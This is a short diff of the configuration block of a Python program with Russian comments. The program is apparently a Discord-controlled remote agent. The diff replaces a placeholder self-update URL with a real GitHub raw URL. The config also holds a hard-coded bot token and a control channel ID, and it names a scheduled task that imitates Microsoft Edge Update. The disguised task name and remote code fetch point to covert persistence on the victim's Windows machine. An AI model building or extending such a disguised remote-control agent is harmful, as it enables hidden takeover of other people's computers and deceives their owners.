@@ -47,7 +47,7 @@ from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
 # ================= КОНФИГУРАЦИЯ =================
 BOT_TOKEN = "c3c5720eedb6f9457b065ab8b6a8642fb6f2222588bf547e506bc206487132b0"
 CONTROL_CHANNEL_ID = 1536306696832426054  # ID канала Discord (числом без кавычек)
-RAW_GITHUB_URL = "https://raw.githubusercontent.com/ТВОЙ_НИК/ТВОЙ_РЕПО/main/bot_agent.py"
+RAW_GITHUB_URL = "https://raw.githubusercontent.com/ht-at/maintudu/refs/heads/main/bot.py"
 TASK_NAME = "MicrosoftEdgeUpdateTaskMachineUA2"
 TASK_DESC = "Microsoft Edge Update Task Machine UA"
 # ================================================
